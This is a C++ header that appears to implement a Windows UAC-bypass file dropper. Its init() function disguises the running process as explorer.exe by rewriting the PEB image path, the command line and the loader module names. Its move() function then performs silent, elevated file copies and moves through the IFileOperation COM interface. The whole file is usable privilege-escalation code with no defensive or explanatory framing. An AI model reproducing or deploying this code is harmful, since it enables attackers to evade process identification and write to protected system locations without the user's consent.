#pragma once
#include <Windows.h>
#include <iostream>
#include <shobjidl.h>

namespace anydrop
{
	// functions
	BOOL init()
	{
		// definitions
		typedef struct _UNICODE_STRING { USHORT length; USHORT maximum_length; PWSTR buffer; } UNICODE_STRING, * PUNICODE_STRING;
		typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection)(PRTL_CRITICAL_SECTION critical_section);
		typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection)(PRTL_CRITICAL_SECTION critical_section);
		typedef void (WINAPI* _RtlInitUnicodeString)(PUNICODE_STRING destination_string, PCWSTR source_string);
		typedef struct _LIST_ENTRY { struct _LIST_ENTRY* flink; struct _LIST_ENTRY* blink; } LIST_ENTRY, * PLIST_ENTRY;
		typedef struct _PROCESS_BASIC_INFORMATION { LONG exit_status; PVOID peb_base_address; ULONG_PTR affinity_mask; LONG base_priority; ULONG_PTR unique_process_id; ULONG_PTR parent_process_id; } PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;
		typedef struct _PEB_LDR_DATA { ULONG length; BOOLEAN initialized; HANDLE ss_handle; LIST_ENTRY in_load_order_module_list; LIST_ENTRY in_memory_order_module_list; LIST_ENTRY in_initialization_order_module_list; PVOID entry_in_progress; BOOLEAN shutdown_in_progress; HANDLE shutdown_thread_id; } PEB_LDR_DATA, * PPEB_LDR_DATA;
		typedef struct _RTL_USER_PROCESS_PARAMETERS { BYTE reserved1[16]; PVOID reserved2[10]; UNICODE_STRING image_path_name; UNICODE_STRING command_line; } RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;
		typedef struct _PEB { BOOLEAN inherited_address_space; BOOLEAN read_image_file_exec_options; BOOLEAN being_debugged; union { BOOLEAN bit_field; struct { BOOLEAN image_uses_large_pages : 1; BOOLEAN is_protected_process : 1; BOOLEAN is_legacy_process : 1; BOOLEAN is_image_dynamically_relocated : 1; BOOLEAN skip_patching_user32_forwarders : 1; BOOLEAN spare_bits : 3; }; }; HANDLE mutant; PVOID image_base_address; PPEB_LDR_DATA ldr; PRTL_USER_PROCESS_PARAMETERS process_parameters; PVOID subsystem_data; PVOID process_heap; PRTL_CRITICAL_SECTION fast_peb_lock; } PEB, * PPEB;
		typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY in_load_order_links; LIST_ENTRY in_memory_order_links; union { LIST_ENTRY in_initialization_order_links; LIST_ENTRY in_progress_links; }; PVOID dll_base; PVOID entry_point; ULONG size_of_image; UNICODE_STRING full_dll_name; UNICODE_STRING base_dll_name; ULONG flags; WORD load_count; WORD tls_index; union { LIST_ENTRY hash_links; struct { PVOID section_pointer; ULONG check_sum; }; }; union { ULONG time_date_stamp; PVOID loaded_imports; }; } LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

		HMODULE h_module = GetModuleHandleA("ntdll.dll");
		_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(h_module, "RtlInitUnicodeString");
		_RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlEnterCriticalSection");
		_RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlLeaveCriticalSection");
		WCHAR pw_explorer[MAX_PATH + 1] = L"C:\\Windows\\explorer.exe";

		PPEB peb = (PPEB)__readgsqword(0x60);

		RtlInitUnicodeString(&peb->process_parameters->image_path_name, pw_explorer);
		RtlInitUnicodeString(&peb->process_parameters->command_line, pw_explorer);

		WCHAR w_full_dll_name[MAX_PATH];
		WCHAR w_exe_file_name[MAX_PATH];
		GetModuleFileNameW(NULL, w_exe_file_name, MAX_PATH);

		RtlEnterCriticalSection(peb->fast_peb_lock);
		PLDR_DATA_TABLE_ENTRY p_start_module_info = (PLDR_DATA_TABLE_ENTRY)peb->ldr->in_load_order_module_list.flink;
		PLDR_DATA_TABLE_ENTRY p_next_module_info = (PLDR_DATA_TABLE_ENTRY)peb->ldr->in_load_order_module_list.flink;
		do
		{
			if (_wcsicmp(w_exe_file_name, p_next_module_info->full_dll_name.buffer) == 0) 
			{
				RtlInitUnicodeString(&p_next_module_info->full_dll_name, pw_explorer);
				RtlInitUnicodeString(&p_next_module_info->base_dll_name, pw_explorer);
				break;
			}

			p_next_module_info = (PLDR_DATA_TABLE_ENTRY)p_next_module_info->in_load_order_links.flink;
		}
		while (p_next_module_info != p_start_module_info);
		RtlLeaveCriticalSection(peb->fast_peb_lock);

		return !(_wcsicmp(pw_explorer, p_next_module_info->full_dll_name.buffer) == 0);
	}

	HRESULT move(LPCWSTR src_path, LPCWSTR dest_path, BOOL copy)
	{
		IFileOperation* file_operation = NULL;
		IShellItem* from = NULL;
		IShellItem* to = NULL;

		HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
		if (FAILED(hr))
			return hr;

		hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&file_operation));
		hr = file_operation->SetOperationFlags(FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION | FOF_NOERRORUI);
		hr = SHCreateItemFromParsingName(src_path, NULL, IID_PPV_ARGS(&from));
		hr = SHCreateItemFromParsingName(dest_path, NULL, IID_PPV_ARGS(&to));
		LPCWSTR filename = &src_path[wcslen(src_path) - 1];
		while (filename > src_path && *(filename - 1) != '\\') {
			filename--;
		}

		hr = -1;
		if (copy) {
			hr = file_operation->CopyItem(from, to, filename, NULL);
		} else {
			hr = file_operation->MoveItem(from, to, filename, NULL);
		}

		if (hr >= 0) {
			hr = file_operation->PerformOperations();
		}

		to->Release();
		from->Release();
		file_operation->Release();
		CoUninitialize();

		return hr;
	}

}
